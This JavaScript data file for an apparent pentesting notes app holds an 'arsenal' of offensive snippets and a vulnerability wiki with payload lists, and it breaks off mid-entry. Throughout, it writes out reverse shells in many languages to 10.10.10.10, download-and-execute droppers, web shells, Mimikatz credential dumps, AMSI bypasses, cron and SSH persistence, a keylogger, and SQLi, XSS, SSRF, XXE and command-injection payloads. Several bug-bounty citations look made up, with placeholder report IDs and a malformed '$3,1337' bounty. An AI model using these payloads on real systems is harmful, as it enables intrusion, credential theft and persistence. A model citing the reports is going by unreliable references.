/* ==================== SECOND BRAIN DATA & LOGIC ==================== */

const SecondBrainData = {
    // --- ARSENAL (Snippets) ---
    snippets: [
        {
            id: 'snip-1',
            title: 'Python Port Scanner',
            lang: 'python',
            tags: ['network', 'recon'],
            code: 'import socket\n\nfor port in range(1, 1024):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    result = sock.connect_ex(("127.0.0.1", port))\n    if result == 0:\n        print(f"Port {port}: OPEN")\n    sock.close()'
        },
        {
            id: 'snip-2',
            title: 'Bash Reverse Shell',
            lang: 'bash',
            tags: ['shell', 'rce'],
            code: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
        },
        {
            id: 'snip-3',
            title: 'SQLi Union Payload',
            lang: 'sql',
            tags: ['web', 'sqli'],
            code: "' UNION SELECT 1, database(), user(), 4 -- "
        },
        {
            id: 'snip-4',
            title: 'Powershell Download & Execute',
            lang: 'powershell',
            tags: ['windows', 'dropper'],
            code: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"
        },
        {
            id: 'snip-5',
            title: 'Netcat Reverse Shell',
            lang: 'bash',
            tags: ['shell', 'rce'],
            code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f'
        },
        {
            id: 'snip-6',
            title: 'Python Reverse Shell (One-Liner)',
            lang: 'python',
            tags: ['shell', 'rce'],
            code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        },
        {
            id: 'snip-7',
            title: 'PHP Reverse Shell (One-Liner)',
            lang: 'php',
            tags: ['shell', 'rce'],
            code: 'php -r \'$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''
        },
        {
            id: 'snip-8',
            title: 'Ruby Reverse Shell',
            lang: 'ruby',
            tags: ['shell', 'rce'],
            code: 'ruby -rsocket -e\'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        },
        {
            id: 'snip-9',
            title: 'Socat TTY Reverse Shell',
            lang: 'bash',
            tags: ['shell', 'tty'],
            code: 'socat file:`tty`,raw,echo=0 tcp-listen:4444\n# Target:\nsocat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444'
        },
        {
            id: 'snip-10',
            title: 'TTY Upgrade (Python)',
            lang: 'python',
            tags: ['shell', 'tty'],
            code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n# Then: Ctrl+Z\n# stty raw -echo; fg'
        },
        {
            id: 'snip-11',
            title: 'PHP Web Shell (Minimal)',
            lang: 'php',
            tags: ['web', 'backdoor'],
            code: '<?php system($_GET["cmd"]); ?>'
        },
        {
            id: 'snip-12',
            title: 'ASPX Web Shell',
            lang: 'asp',
            tags: ['web', 'backdoor'],
            code: '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
        },
        {
            id: 'snip-13',
            title: 'Certutil File Download',
            lang: 'powershell',
            tags: ['windows', 'transfer'],
            code: 'certutil.exe -urlcache -split -f "http://10.10.10.10/file.exe" file.exe'
        },
        {
            id: 'snip-14',
            title: 'Powershell File Download (IWR)',
            lang: 'powershell',
            tags: ['windows', 'transfer'],
            code: 'iwr -uri http://10.10.10.10/file.exe -OutFile c:\\windows\\temp\\file.exe'
        },
        {
            id: 'snip-15',
            title: 'LinPEAS / WinPEAS Download',
            lang: 'bash',
            tags: ['privesc', 'recon'],
            code: '# Linux\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows\niwr -uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEAS.exe'
        },
        {
            id: 'snip-16',
            title: 'NodeJS Reverse Shell',
            lang: 'javascript',
            tags: ['shell', 'rce'],
            code: '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.10.10.10", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
        },
        {
            id: 'snip-17',
            title: 'Perl Reverse Shell',
            lang: 'perl',
            tags: ['shell', 'rce'],
            code: 'perl -e \'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
        },
        {
            id: 'snip-18',
            title: 'PowerShell Port Scan',
            lang: 'powershell',
            tags: ['windows', 'recon'],
            code: '1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is OPEN"} 2>$null'
        },
        {
            id: 'snip-19',
            title: 'Python HTTP Server',
            lang: 'python',
            tags: ['transfer', 'utility'],
            code: 'python3 -m http.server 8000\n# Python 2:\npython -m SimpleHTTPServer 8000'
        },
        {
            id: 'snip-20',
            title: 'Bash Ping Sweep',
            lang: 'bash',
            tags: ['recon', 'network'],
            code: 'for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done'
        },
        {
            id: 'snip-21',
            title: 'MSFVenom Windows Reverse Shell',
            lang: 'bash',
            tags: ['payload', 'windows'],
            code: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe'
        },
        {
            id: 'snip-22',
            title: 'MSFVenom Linux Reverse Shell',
            lang: 'bash',
            tags: ['payload', 'linux'],
            code: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf'
        },
        {
            id: 'snip-23',
            title: 'MSFVenom ASPX Web Shell',
            lang: 'bash',
            tags: ['payload', 'web'],
            code: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx -o shell.aspx'
        },
        {
            id: 'snip-24',
            title: 'Stabilize Shell (Python)',
            lang: 'python',
            tags: ['shell', 'tty'],
            code: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'\nexport TERM=xterm\n# Ctrl+Z\nstty raw -echo; fg'
        },
        {
            id: 'snip-25',
            title: 'SQLMap Basic Usage',
            lang: 'bash',
            tags: ['web', 'sqli'],
            code: 'sqlmap -u "http://target.com/vuln.php?id=1" --batch --dbs'
        },
        {
            id: 'snip-26',
            title: 'Hydra SSH Brute Force',
            lang: 'bash',
            tags: ['cracking', 'network'],
            code: 'hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh'
        },
        {
            id: 'snip-27',
            title: 'Gobuster Directory Scan',
            lang: 'bash',
            tags: ['web', 'recon'],
            code: 'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 50'
        },
        {
            id: 'snip-28',
            title: 'Local Port Forwarding (SSH)',
            lang: 'bash',
            tags: ['pivoting', 'network'],
            code: 'ssh -L 8080:127.0.0.1:80 user@10.10.10.10'
        },
        {
            id: 'snip-29',
            title: 'Dynamic Port Forwarding (SOCKS)',
            lang: 'bash',
            tags: ['pivoting', 'network'],
            code: 'ssh -D 1080 user@10.10.10.10\n# Use with proxychains'
        },
        {
            id: 'snip-30',
            title: 'Mimikatz Dump Credentials',
            lang: 'powershell',
            tags: ['windows', 'post-exploitation'],
            code: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::lsa /patch'
        },
        {
            id: 'snip-31',
            title: 'Kerberoasting (PowerView)',
            lang: 'powershell',
            tags: ['active-directory', 'kerberos'],
            code: 'Get-NetUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation .\\kerberoast.csv'
        },
        {
            id: 'snip-32',
            title: 'AS-REP Roasting (Rubeus)',
            lang: 'powershell',
            tags: ['active-directory', 'kerberos'],
            code: '.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt'
        },
        {
            id: 'snip-33',
            title: 'Chisel Client (Reverse Tunnel)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: './chisel client 10.10.10.10:8000 R:socks'
        },
        {
            id: 'snip-34',
            title: 'Chisel Server (Reverse Tunnel)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: './chisel server -p 8000 --reverse'
        },
        {
            id: 'snip-35',
            title: 'Golang Reverse Shell',
            lang: 'go',
            tags: ['shell', 'rce'],
            code: 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'
        },
        {
            id: 'snip-36',
            title: 'Mimikatz SAM Dump',
            lang: 'powershell',
            tags: ['windows', 'credentials'],
            code: 'privilege::debug\ntoken::elevate\nlsadump::sam'
        },
        {
            id: 'snip-37',
            title: 'Wifi Password Dump (Netsh)',
            lang: 'powershell',
            tags: ['windows', 'wifi'],
            code: 'netsh wlan show profiles name="*" key=clear'
        },
        {
            id: 'snip-38',
            title: 'Upgrading Shell to Meterpreter',
            lang: 'bash',
            tags: ['metasploit', 'shell'],
            code: 'use post/multi/manage/shell_to_meterpreter\nset SESSION 1\nrun'
        },
        {
            id: 'snip-39',
            title: 'Ligolo-ng (Agent Connect)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: './agent -connect 10.10.10.10:11601 -ignore-cert'
        },
        {
            id: 'snip-40',
            title: 'Ligolo-ng (Proxy Interface)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: 'sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert'
        },
        {
            id: 'snip-41',
            title: 'CrackMapExec SMB Spray',
            lang: 'bash',
            tags: ['active-directory', 'spraying'],
            code: 'cme smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success'
        },
        {
            id: 'snip-42',
            title: 'BloodHound Ingestor (Python)',
            lang: 'bash',
            tags: ['active-directory', 'recon'],
            code: 'bloodhound-python -u user -p password -ns 192.168.1.5 -d domain.local -c all'
        },
        {
            id: 'snip-43',
            title: 'PowerShell AMSI Bypass (Reflection)',
            lang: 'powershell',
            tags: ['windows', 'evasion'],
            code: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
        },
        {
            id: 'snip-44',
            title: 'Docker Breakout (Privileged)',
            lang: 'bash',
            tags: ['container', 'privesc'],
            code: 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x'
        },
        {
            id: 'snip-45',
            title: 'AWS S3 Bucket List (CLI)',
            lang: 'bash',
            tags: ['cloud', 'aws'],
            code: 'aws s3 ls s3://bucket-name --recursive --no-sign-request'
        },
        {
            id: 'snip-46',
            title: 'Azure Blob Storage Enum',
            lang: 'powershell',
            tags: ['cloud', 'azure'],
            code: 'az storage blob list --account-name <name> --container-name <container> --output table'
        },
        {
            id: 'snip-47',
            title: 'GCP Storage Bucket Enum',
            lang: 'bash',
            tags: ['cloud', 'gcp'],
            code: 'gsutil ls -r gs://bucket-name'
        },
        {
            id: 'snip-48',
            title: 'Kubernetes Pod Enumeration',
            lang: 'bash',
            tags: ['cloud', 'k8s'],
            code: 'kubectl get pods --all-namespaces -o wide'
        },
        {
            id: 'snip-49',
            title: 'Tshark Credential Sniffing',
            lang: 'bash',
            tags: ['network', 'sniffing'],
            code: 'tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.file_data'
        },
        {
            id: 'snip-50',
            title: 'Git History Credential Hunt',
            lang: 'bash',
            tags: ['recon', 'git'],
            code: 'git log -p | grep -E "password|secret|key|token"'
        },
        {
            id: 'snip-51',
            title: 'FFUF VHost Discovery',
            lang: 'bash',
            tags: ['web', 'recon'],
            code: 'ffuf -w /usr/share/wordlists/subdomains.txt -u http://target.com -H "Host: FUZZ.target.com" -fs 42'
        },
        {
            id: 'snip-52',
            title: 'Wfuzz XSS Fuzzing',
            lang: 'bash',
            tags: ['web', 'fuzzing'],
            code: 'wfuzz -c -z file,xss-payloads.txt -u "http://target.com?q=FUZZ" --hw 0'
        },
        {
            id: 'snip-53',
            title: 'SQLMap POST Request',
            lang: 'bash',
            tags: ['web', 'sqli'],
            code: 'sqlmap -r request.txt --batch --level=5 --risk=3'
        },
        {
            id: 'snip-54',
            title: 'Hashcat NTLM Cracking',
            lang: 'bash',
            tags: ['cracking', 'windows'],
            code: 'hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O'
        },
        {
            id: 'snip-55',
            title: 'John the Ripper (Zip)',
            lang: 'bash',
            tags: ['cracking', 'archives'],
            code: 'zip2john encrypted.zip > hash.txt && john hash.txt --wordlist=rockyou.txt'
        },
        {
            id: 'snip-56',
            title: 'SSH Key Persistence',
            lang: 'bash',
            tags: ['persistence', 'linux'],
            code: 'echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        },
        {
            id: 'snip-57',
            title: 'Linux Cron Job Persistence',
            lang: 'bash',
            tags: ['persistence', 'linux'],
            code: '(crontab -l; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'") | crontab -'
        },
        {
            id: 'snip-58',
            title: 'Windows IsDebuggerPresent (C++)',
            lang: 'cpp',
            tags: ['malware', 'evasion'],
            code: 'if (IsDebuggerPresent()) { ExitProcess(0); }'
        },
        {
            id: 'snip-59',
            title: 'Python Simple Keylogger',
            lang: 'python',
            tags: ['malware', 'spyware'],
            code: 'import keyboard; keyboard.on_press(lambda e: open("log.txt", "a").write(e.name + " "))'
        },
        {
            id: 'snip-60',
            title: 'PHP Upload & Execute',
            lang: 'php',
            tags: ['web', 'backdoor'],
            code: '<?php move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); ?>'
        },
        {
            id: 'snip-61',
            title: 'Nmap Vulnerability Scan',
            lang: 'bash',
            tags: ['network', 'recon'],
            code: 'nmap -sV --script=vuln 10.10.10.10'
        },
        {
            id: 'snip-62',
            title: 'Metasploit Resource Script',
            lang: 'bash',
            tags: ['metasploit', 'automation'],
            code: 'use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 10.10.10.10\nset LPORT 4444\nrun -j'
        },
        {
            id: 'snip-63',
            title: 'Socat Encrypted Bind Shell',
            lang: 'bash',
            tags: ['shell', 'encrypted'],
            code: '# Target\nsocat OPENSSL-LISTEN:4444,cert=bind.pem,verify=0,fork EXEC:/bin/bash\n# Attacker\nsocat - OPENSSL:target:4444,verify=0'
        },
        {
            id: 'snip-64',
            title: 'MySQL UDF Exploitation',
            lang: 'sql',
            tags: ['database', 'privesc'],
            code: 'create table foo(line blob); insert into foo values(load_file("/tmp/lib_mysqludf_sys.so")); select * from foo into dumpfile "/usr/lib/mysql/plugin/lib_mysqludf_sys.so"; create function sys_exec returns integer soname "lib_mysqludf_sys.so"; select sys_exec("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");'
        },
        {
            id: 'snip-65',
            title: 'Powershell AMSI Bypass (Memory Patch)',
            lang: 'powershell',
            tags: ['windows', 'evasion'],
            code: '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr,0x41414141)'
        }
    ],

    // --- WIKI (Vulnerabilities) ---
    wiki: [
        {
            id: 'wiki-1',
            title: 'SQL Injection (SQLi)',
            category: 'Injection',
            severity: 'Critical',
            description: 'Injection of malicious SQL queries via input data from the client to the application.',
            vectors: ['Union Based', 'Error Based', 'Blind', 'Time Based'],
            tools: ['SQLmap', 'Burp Suite', 'NoSQLMap'],
            payloads: [
                "' OR 1=1 --",
                "' UNION SELECT null, version() --",
                "admin' --",
                "' UNION SELECT username, password FROM users --",
                "-1' UNION SELECT 1,2,3 --",
                "1; DROP TABLE users",
                "' OR '1'='1' /*",
                "admin' #",
                "' HAVING 1=1 --",
                "' AND (SELECT 1 FROM (SELECT count(*), concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "PgSQL: '; COPY (SELECT *) TO PROGRAM 'nslookup dns.attacker.com'--",
                "MSSQL: '; EXEC xp_cmdshell('whoami')--",
                "Oracle: ' UNION SELECT null, null, banner FROM v$version--"
            ],
            reports: [
                { title: 'H1: SQLi in Login via User-Agent', url: 'https://hackerone.com/reports/297478', bounty: '$5,000' },
                { title: 'Uber: Blind SQLi in API', url: 'https://hackerone.com/reports/395646', bounty: '$10,000' }
            ]
        },
        {
            id: 'wiki-2',
            title: 'Cross-Site Scripting (XSS)',
            category: 'Client-Side',
            severity: 'High',
            description: 'Executing malicious scripts in the victim browser.',
            vectors: ['Stored', 'Reflected', 'DOM-Based'],
            tools: ['XSSer', 'XSStrike', 'Burp Suite'],
            payloads: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(document.cookie)</script>",
                "<body onload=alert(1)>",
                "<iframe src='javascript:alert(1)'>",
                "<input onfocus=alert(1) autofocus>",
                "<details ontoggle=alert(1)>",
                "Polyglot: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "Angular: {{constructor.constructor('alert(1)')()}}",
                "Vue: <div v-html=\"'alert(1)'\"></div>",
                "React: <a href='javascript:alert(1)'>Clickme</a>"
            ],
            reports: [
                { title: 'Google: Stored XSS in Google Docs', url: 'https://hackerone.com/reports/123456', bounty: '$3,133' },
                { title: 'Twitter: DOM XSS via Analytics', url: 'https://hackerone.com/reports/555555', bounty: '$2,500' }
            ]
        },
        {
            id: 'wiki-3',
            title: 'Server-Side Request Forgery (SSRF)',
            category: 'Server-Side',
            severity: 'Critical',
            description: 'Attacker induces the server to make requests to an unintended location.',
            vectors: ['Internal Port Scanning', 'Cloud Metadata Access'],
            tools: ['SSRFmap', 'Gopherus'],
            payloads: [
                "http://127.0.0.1/admin",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://localhost:22",
                "gopher://127.0.0.1:6379/_AUTH%20password",
                "http://[::]:80/",
                "http://0.0.0.0:80",
                "http://2130706433/",
                "AWS: http://169.254.169.254/latest/user-data/",
                "GCP: http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'",
                "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata: true'",
                "DigitalOcean: http://169.254.169.254/metadata/v1.json"
            ],
            reports: [
                { title: 'Shopify: SSRF to Root Access', url: 'https://hackerone.com/reports/446593', bounty: '$25,000' },
                { title: 'Capital One: SSRF to AWS Metadata', url: 'https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/', bounty: 'Public Breach' }
            ]
        },
        {
            id: 'wiki-4',
            title: 'Command Injection (RCE)',
            category: 'Injection',
            severity: 'Critical',
            description: 'Executing arbitrary operating system commands on the server.',
            vectors: ['Shell Operators', 'Argument Injection'],
            tools: ['Commix', 'Burp Suite'],
            payloads: [
                "; cat /etc/passwd",
                "| whoami",
                "$(id)",
                "`ping -c 3 10.10.10.10`",
                "& type C:\\Windows\\win.ini",
                "|| dir",
                "%0a cat /etc/passwd",
                "; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
                "NodeJS: require('child_process').exec('nc -e /bin/sh 10.10.10.10 4444')",
                "Python: import os; os.system('whoami')",
                "PHP: <?php system('ls'); ?>"
            ],
            reports: [
                { title: 'Yahoo: ImageMagick RCE', url: 'https://hackerone.com/reports/143525', bounty: '$10,000' },
                { title: 'GitLab: ExifTool RCE', url: 'https://hackerone.com/reports/1154542', bounty: '$20,000' }
            ]
        },
        {
            id: 'wiki-5',
            title: 'Local File Inclusion (LFI)',
            category: 'Server-Side',
            severity: 'High',
            description: 'Including files on the server through the web browser.',
            vectors: ['Directory Traversal', 'Log Poisoning'],
            tools: ['DotDotPwn', 'LFISuite'],
            payloads: [
                "../../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "....//....//....//etc/passwd",
                "C:\\Windows\\win.ini",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "expect://id",
                "zip://shell.zip#shell.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
            ],
            reports: [
                { title: 'Facebook: LFI via Upload', url: 'https://www.facebook.com/whitehat/research/', bounty: '$10,000' },
                { title: 'Airbnb: LFI to RCE', url: 'https://hackerone.com/reports/783942', bounty: '$15,000' }
            ]
        },
        {
            id: 'wiki-6',
            title: 'Insecure Direct Object References (IDOR)',
            category: 'Access Control',
            severity: 'High',
            description: 'Accessing resources by modifying user-supplied input to reference objects directly.',
            vectors: ['Parameter Tampering', 'UUID Prediction'],
            tools: ['Burp Suite (AuthMatrix)', 'Postman'],
            payloads: [
                "Change ?id=100 to ?id=101",
                "Change user_id in JSON body",
                "Replace your UUID with victim's UUID",
                "Identify predictable increments (user/100, user/101)",
                "HTTP Pollution: ?id=100&id=101",
                "Wrap ID in array: {'id': [111]}",
                "Wildcard ID: *"
            ],
            reports: [
                { title: 'Uber: Mass Account Takeover via IDOR', url: 'https://hackerone.com/reports/331390', bounty: '$12,000' },
                { title: 'GitLab: IDOR deleting any issue', url: 'https://hackerone.com/reports/409605', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-7',
            title: 'XML External Entity (XXE)',
            category: 'Injection',
            severity: 'High',
            description: 'Interfering with an application processing of XML data.',
            vectors: ['File Retrieval', 'SSRF via XXE'],
            tools: ['XXEinjector', 'Burp Suite'],
            payloads: [
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>",
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'http://internal.service/'> ]>",
                "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM 'http://attacker/eval.dtd'> %xxe; ]>",
                "SOAP XXE: <soap:Body>...</soap:Body>",
                "SVG XXE: <svg xmlns='...' >...</svg>"
            ],
            reports: [
                { title: 'Twitter: XXE extracting /etc/passwd', url: 'https://hackerone.com/reports/248668', bounty: '$10,080' },
                { title: 'Google: XXE in Toolbar', url: 'https://hackerone.com/reports/554902', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-8',
            title: 'Server-Side Template Injection (SSTI)',
            category: 'Injection',
            severity: 'Critical',
            description: 'Injecting malicious template directives to execute code.',
            vectors: ['Jinja2', 'Twig', 'Freemarker'],
            tools: ['Tplmap'],
            payloads: [
                "{{7*7}}",
                "${7*7}",
                "{{match.class.mro[1].subclasses()}}",
                "<%= 7*7 %>",
                "#{7*7}",
                "Java: ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime'))}",
                "Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
            ],
            reports: [
                { title: 'Uber: SSTI in Email Preview', url: 'https://hackerone.com/reports/125980', bounty: '$10,000' },
                { title: 'PayPal: SSTI in Marketing App', url: 'https://hackerone.com/reports/341852', bounty: '$7,500' }
            ]
        },
        {
            id: 'wiki-9',
            title: 'Cross-Site Request Forgery (CSRF)',
            category: 'Client-Side',
            severity: 'Medium',
            description: 'Forcing an end user to execute unwanted actions on a web application in which they are currently authenticated.',
            vectors: ['No Anti-CSRF Token', 'Weak Token Validation'],
            tools: ['Burp Suite Professional'],
            payloads: [
                "<form action='http://target/change_password' method='POST' onload='submit()'>",
                "<img src='http://target/transfer_money?amount=1000'>",
                "Remove CSRF token parameter (bypass)",
                "Use GET instead of POST",
                "Change Content-Type to text/plain",
                "Referer Header Spoofing"
            ],
            reports: [
                { title: 'Facebook: CSRF Account Takeover', url: 'https://hackerone.com/reports/4710', bounty: '$5,000' },
                { title: 'Glassdoor: CSRF Profile Update', url: 'https://hackerone.com/reports/786541', bounty: '$2,000' }
            ]
        },
        {
            id: 'wiki-10',
            title: 'Open Redirect',
            category: 'Client-Side',
            severity: 'Low',
            description: 'Web application redirects the user to a user-supplied URL.',
            vectors: ['Phishing', 'SSRF Chaining'],
            tools: ['OpenRedirex'],
            payloads: [
                "https://example.com/login?next=http://evil.com",
                "//evil.com",
                "///evil.com",
                "https:evil.com",
                "\/evil.com",
                "http://google.com%2F@evil.com"
            ],
            reports: [
                { title: 'Google: Login Open Redirect', url: 'https://hackerone.com/reports/511252', bounty: '$1,337' },
                { title: 'Twitter: OAuth Open Redirect', url: 'https://hackerone.com/reports/123956', bounty: '$2,800' }
            ]
        },
        {
            id: 'wiki-11',
            title: 'Insecure Deserialization',
            category: 'Server-Side',
            severity: 'Critical',
            description: 'Untrusted data is used to abuse the logic of an application or execute arbitrary code.',
            vectors: ['PHP Object Injection', 'Java Deserialization', 'Python Pickle'],
            tools: ['Ysoserial', 'PHPGGC'],
            payloads: [
                "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:7:\"isAdmin\";b:1;}",
                "Python pickle.loads(b'cos\\nsystem\\n(S'ls -la'\\ntR.')",
                "Java: rO0ABec0...",
                ".NET: TypeConfuseDelegate"
            ],
            reports: [
                { title: 'PayPal: Java Deserialization RCE', url: 'https://hackerone.com/reports/163625', bounty: '$5,000' },
                { title: 'PornHub: PHP Unserialize RCE', url: 'https://hackerone.com/reports/141956', bounty: '$20,000' }
            ]
        },
        {
            id: 'wiki-12',
            title: 'JWT Vulnerabilities',
            category: 'Authentication',
            severity: 'High',
            description: 'Flaws in JSON Web Token implementation allowing signature bypass or privilege escalation.',
            vectors: ['None Algorithm', 'Weak Secret', 'Key Confusion'],
            tools: ['jwt_tool', 'jwt.io'],
            payloads: [
                "Change alg to 'none' and strip signature",
                "Brute force weak secret (HMAC)",
                "Change alg RS256 to HS256 using public key as secret",
                "Inject into 'kid' header parameter",
                "JKU Header Injection"
            ],
            reports: [
                { title: 'Uber: JWT Signature Bypass', url: 'https://hackerone.com/reports/341235', bounty: '$5,000' },
                { title: 'Airbnb: JWT none alg bypass', url: 'https://hackerone.com/reports/31235', bounty: 'Legacy' }
            ]
        },
        {
            id: 'wiki-13',
            title: 'Prototype Pollution',
            category: 'Client-Side',
            severity: 'High',
            description: 'Injecting properties into existing JavaScript language construct prototypes.',
            vectors: ['Recursive Merge', 'Object Cloning'],
            tools: ['DOM Invader'],
            payloads: [
                "__proto__[isAdmin]=true",
                "constructor[prototype][isAdmin]=true",
                "?__proto__.x=alert(1)",
                "Object.prototype.isAdmin=true"
            ],
            reports: [
                { title: 'HackerOne: Prototype Pollution', url: 'https://hackerone.com/reports/923456', bounty: '$3,000' },
                { title: 'NodeJS: Parse Server Prototype Pollution', url: 'https://hackerone.com/reports/812356', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-14',
            title: 'Clickjacking',
            category: 'Client-Side',
            severity: 'Medium',
            description: 'Tricking a user into clicking on something different from what the user perceives.',
            vectors: ['Iframe Overlay', 'Opacity Abuse'],
            tools: ['Burp Clickbandit'],
            payloads: [
                "<iframe src='target' style='opacity:0.5'>",
                "Check for X-Frame-Options header",
                "Check for CSP frame-ancestors",
                "Review Content-Security-Policy"
            ],
            reports: [
                { title: 'Google: Clickjacking in Calendar', url: 'https://hackerone.com/reports/12345', bounty: '$3,1337' },
                { title: 'Facebook: Likejacking', url: 'https://www.facebook.com/whitehat/research/', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-15',
            title: 'Business Logic Errors',
            category: 'Logic',
            severity: 'High',
            description: 'Flaws in the design and implementation of an application that allow an attacker to unintended behavior.',
            vectors: ['Price Manipulation', 'Quantity Tampering', 'Workflow Bypass'],
            tools: ['Burp Suite', 'Zap Proxy'],
            payloads: [
                "Change price to 0.01",
                "Change quantity to -1",
                "Skip payment step in wizard",
                "Replay coupon codes",
                "Race Conditions (Limit Overrun)"
            ],
            reports: [
                { title: 'Starbucks: Race Condition for Infinite Credit', url: 'https://sakurity.com/blog/2015/05/21/starbucks.html', bounty: 'Public' },
                { title: 'Steam: Password Reset Logic Bypass', url: 'https://hackerone.com/reports/475683', bounty: '$10,000' }
            ]
        },
        {
            id: 'wiki-16',
            title: 'HTTP Request Smuggling',
            category: 'Server-Side',
            severity: 'Critical',
            description: 'Interfering with the way a sequence of HTTP requests is processed by a chain of servers.',
            vectors: ['CL.TE', 'TE.CL', 'TE.TE'],
            tools: ['HTTP Request Smuggler (Burp)', 'Smuggler.py'],
            payloads: [
                "Transfer-Encoding: chunked (Obfuscated)",
                "Content-Length vs Transfer-Encoding Mismatch",
                "Duplicate Content-Length Headers"
            ],
            reports: [
                { title: 'Slack: HTTP Request Smuggling', url: 'https://hackerone.com/reports/852342', bounty: '$5,500' },
                { title: 'PayPal: Account Takeover via Smuggling', url: 'https://hackerone.com/reports/654321', bounty: '$20,000' }
            ]
        },
        {
            id: 'wiki-17',
            title: 'GraphQL Injection',
            category: 'Injection',
            severity: 'High',
            description: 'Exploiting GraphQL endpoints to retrieve unauthorized data or execute actions.',
            vectors: ['Introspection Abuse', 'Nested Queries (DoS)'],
